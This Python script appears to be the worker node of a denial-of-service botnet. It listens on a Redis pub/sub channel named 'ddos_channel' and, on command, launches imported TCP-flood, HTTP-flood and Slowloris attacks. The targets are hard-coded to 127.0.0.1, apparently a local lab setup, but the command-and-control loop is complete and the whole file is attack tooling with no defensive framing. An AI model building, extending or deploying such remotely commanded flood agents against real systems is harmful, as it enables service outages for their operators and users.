import time
import sys
from infra.pubsub import PubSubClient
from attack.tcp_flood import run_tcp_flood
from attack.http_flood import run_http_flood
from attack.slowloris import run_slowloris


if __name__ == "__main__":
    channel = sys.argv[1] if len(sys.argv) > 1 else "ddos_channel"
    print(f"================ Ninja Node Started (channel={channel}) ================")
    sub = PubSubClient(channel=channel)
    print("[NINJA] Connected to Redis channel:", sub.channel)

    try:
        pubsub = sub.redis.pubsub()
        pubsub.subscribe(sub.channel)
        print(f"[NINJA] Subscribed to channel '{sub.channel}'")

        while True:
            msg = pubsub.get_message(ignore_subscribe_messages=True)
            if msg:
                print(f"[NINJA] Raw message received: {msg}")
                if msg['type'] == 'message':
                    cmd = msg['data'].strip().lower()
                    print(f"[NINJA] Executing received command: {cmd}")

                    if cmd == "tcp":
                        run_tcp_flood("127.0.0.1", 80, 10)
                    elif cmd == "http":
                        run_http_flood("http://127.0.0.1", 10)
                    elif cmd == "slowloris":
                        run_slowloris("127.0.0.1", 80, 30)
                    else:
                        print(f"[NINJA] Unknown command: '{cmd}' — ignoring.")
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[NINJA] Shutting down gracefully.")